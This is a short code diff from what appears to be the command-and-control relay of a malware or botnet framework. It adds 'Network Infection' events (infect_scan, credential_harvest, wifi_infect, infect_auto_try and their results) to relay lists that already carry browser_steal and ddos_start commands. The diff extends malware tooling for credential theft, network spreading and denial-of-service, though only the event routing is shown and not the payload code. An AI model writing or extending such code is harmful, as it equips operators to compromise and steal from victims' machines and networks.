@@ -292,6 +292,9 @@ RELAY_TO_CLIENT = [
     "network_info", "browser_steal",
     # DDoS
     "ddos_start", "ddos_stop",
+    # Network Infection
+    "infect_scan", "infect_start", "infect_test_credentials",
+    "credential_harvest", "wifi_infect", "infect_auto_try",
 ]
 
 for event_name in RELAY_TO_CLIENT:
@@ -337,6 +340,10 @@ RELAY_TO_OPERATOR = [
     "network_info_result", "browser_steal_result",
     # DDoS
     "ddos_status", "ddos_result",
+    # Network Infection
+    "infect_scan_result", "infect_result", "infect_credential_result",
+    "credential_harvest_result", "wifi_infect_result", "infect_auto_result",
+    "infect_status",
 ]
 
 for event_name in RELAY_TO_OPERATOR:
